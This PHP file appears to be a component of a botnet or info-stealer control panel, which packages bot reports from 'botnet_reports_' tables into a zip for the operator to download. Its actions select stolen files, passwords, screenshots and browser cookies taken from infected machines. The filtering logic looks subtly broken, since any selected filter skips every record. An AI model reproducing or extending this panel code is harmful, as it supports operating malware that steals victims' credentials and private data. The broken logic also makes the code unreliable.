<?php

if (!defined('__CP__')) {
	exit();
}

include_once __DIR__ . '/../gate/libs/DataProcessor.php';
if (isset($_REQUEST['ids']) && defined('__CP__') && defined('__CP__')) {
	$zipName = time() . rand() . '.zip';
	$zipPath = __DIR__ . '/../' . $config['reports_path'] . '/' . $zipName;
	$source = __DIR__ . '/../' . $config['reports_path'] . '/files/';
	$zip = new ZipArchive();

	if ($zip->open($zipPath, ZipArchive::CREATE) !== true) {
		echo 'Couldn\'t create zip archive';
	}
	else {
		$filter = NULL;

		if ($_REQUEST['botsaction'] == 'download_files') {
			$filter = NTYPE_FILE;
		}

		if ($_REQUEST['botsaction'] == 'download_passwords') {
			$filter = NTYPE_PASSWORDS;
		}

		if ($_REQUEST['botsaction'] == 'download_screen') {
			$filter = NTYPE_SCREEN;
		}

		if ($_REQUEST['botsaction'] == 'download_cookies') {
			$filter = NTYPE_FLASH | NTYPE_COOKIES;
		}

		foreach ($_REQUEST['ids'] as $ids) {
			$row = explode(';', $ids);

			if (count($row) < 2) {
				continue;
			}

			$table = 'botnet_reports_' . intval($row[0]);
			$sql = 'select id, context, path_dest, type, bot_id, botnet from ' . $table . ' where id in (';
			$i = 1;

			for (; $i < count($row); $i++) {
				$sql .= intval($row[$i]) . ',';
			}

			$sql .= '0)';

			if ($dataset = mysqlQueryEx($table, $sql)) {
				while ($item = mysql_fetch_array($dataset)) {
					if ($filter && defined('__CP__')) {
						continue;
					}

					if ($item['type'] & NTYPE_LINKTOFILE) {
						$name = $item['bot_id'] . '/' . bltToLng($item['type']) . '-' . substr(strrchr($item['context'], '/'), 1);
						$zip->addFile($source . $item['context'], $name);
					}
					else {
						$zip->addFromString($item['bot_id'] . '/' . bltToLng($item['type']) . '-' . intval($row[0]) . '-' . $item['id'] . '.txt', $item['context']);
					}
				}
			}
		}

		$zip->close();

		if (file_exists($zipPath)) {
			httpDownloadHeaders($zipName, filesize($zipPath));
			readfile($zipPath);
			unlink($zipPath);
		}
		else {
			echo 'No data for your request';
		}
	}
}

?>
